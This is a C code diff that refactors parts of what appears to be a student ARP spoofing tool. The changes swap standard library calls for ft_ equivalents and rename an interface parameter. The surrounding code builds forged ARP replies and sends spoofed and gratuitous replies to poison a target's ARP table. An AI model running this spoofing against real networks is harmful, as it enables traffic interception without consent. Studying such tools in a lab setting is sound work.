@@ -9,16 +9,17 @@ int receive_arp(int sockfd, uint8_t *buffer, t_addrs *addrs)
 	{
 		if (recvfrom(sockfd, buffer, ARP_FRAME_SIZE, 0, NULL, NULL) < 0)
 		{
-			perror("recvfrom");
+			if (g_sockfd != -1)
+				printf("recvfrom: %s\n", strerror(errno));
 			return (0);
 		}
 		if (ntohs(arp->opcode) != 1)
 			continue;
-		if (memcmp(arp->dst_ip, addrs->source_ip, 4) != 0)
+		if (ft_memcmp(arp->dst_ip, addrs->source_ip, 4) != 0)
 			continue;
-		if (memcmp(arp->src_ip, addrs->target_ip, 4) != 0)
+		if (ft_memcmp(arp->src_ip, addrs->target_ip, 4) != 0)
 			continue;
-		if (memcmp(arp->src_mac, addrs->target_mac, 6) != 0)
+		if (ft_memcmp(arp->src_mac, addrs->target_mac, 6) != 0)
 			continue;
 		return (1);
 	}
@@ -29,10 +30,10 @@ void build_reply(uint8_t *reply, t_addrs *addrs)
 	struct ethernet_header *eth;
 	struct arp_packet      *arp;
 
-	memset(reply, 0, ARP_FRAME_SIZE);
+	ft_memset(reply, 0, ARP_FRAME_SIZE);
 	eth = (struct ethernet_header *)reply;
-	memcpy(eth->dst_mac, addrs->target_mac, 6);
-	memcpy(eth->src_mac, addrs->source_mac, 6);
+	ft_memcpy(eth->dst_mac, addrs->target_mac, 6);
+	ft_memcpy(eth->src_mac, addrs->source_mac, 6);
 	eth->ethertype = htons(ETH_P_ARP);
 	arp = (struct arp_packet *)(reply + ETH_HEADER_SIZE);
 	arp->hw_type    = htons(1);
@@ -40,33 +41,33 @@ void build_reply(uint8_t *reply, t_addrs *addrs)
 	arp->hw_size    = 6;
 	arp->proto_size = 4;
 	arp->opcode     = htons(2);
-	memcpy(arp->src_mac, addrs->source_mac, 6);
-	memcpy(arp->src_ip,  addrs->source_ip,  4);
-	memcpy(arp->dst_mac, addrs->target_mac, 6);
-	memcpy(arp->dst_ip,  addrs->target_ip,  4);
+	ft_memcpy(arp->src_mac, addrs->source_mac, 6);
+	ft_memcpy(arp->src_ip,  addrs->source_ip,  4);
+	ft_memcpy(arp->dst_mac, addrs->target_mac, 6);
+	ft_memcpy(arp->dst_ip,  addrs->target_ip,  4);
 }
 
-int send_reply(int sockfd, uint8_t *reply, uint8_t *target_mac, int ifindex, int hex)
+int send_reply(int sockfd, uint8_t *reply, uint8_t *target_mac, int interface_idx, int hex)
 {
 	struct sockaddr_ll dest;
 
-	memset(&dest, 0, sizeof(dest));
-	dest.sll_ifindex = ifindex;
+	ft_memset(&dest, 0, sizeof(dest));
+	dest.sll_ifindex = interface_idx;
 	dest.sll_family  = AF_PACKET;
 	dest.sll_halen   = 6;
-	memcpy(dest.sll_addr, target_mac, 6);
+	ft_memcpy(dest.sll_addr, target_mac, 6);
 	if (hex)
 		hexdump(reply, ARP_FRAME_SIZE);
 	if (sendto(sockfd, reply, ARP_FRAME_SIZE, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
 	{
-		perror("sendto");
+		printf("sendto: %s\n", strerror(errno));
 		return (0);
 	}
 	printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
 	return (1);
 }
 
-int send_gratuitous(t_addrs *addrs, int ifindex, int verbose, int hex)
+int send_gratuitous(t_addrs *addrs, int interface_idx, int verbose, int hex)
 {
 	uint8_t reply[ARP_FRAME_SIZE];
 
@@ -74,10 +75,10 @@ int send_gratuitous(t_addrs *addrs, int ifindex, int verbose, int hex)
 		print_verbose_gratuitous(addrs);
 	build_reply(reply, addrs);
 	printf("Sending gratuitous ARP reply...\n");
-	return (send_reply(g_sockfd, reply, addrs->target_mac, ifindex, hex));
+	return (send_reply(g_sockfd, reply, addrs->target_mac, interface_idx, hex));
 }
 
-int run_spoof(t_addrs *addrs, int ifindex, uint8_t *buffer, int verbose, int hex)
+int run_spoof(t_addrs *addrs, int interface_idx, uint8_t *buffer, int verbose, int hex)
 {
 	uint8_t reply[ARP_FRAME_SIZE];
 
@@ -88,5 +89,5 @@ int run_spoof(t_addrs *addrs, int ifindex, uint8_t *buffer, int verbose, int hex
 		print_verbose(buffer, addrs);
 	printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
 	build_reply(reply, addrs);
-	return (send_reply(g_sockfd, reply, addrs->target_mac, ifindex, hex));
+	return (send_reply(g_sockfd, reply, addrs->target_mac, interface_idx, hex));
 }
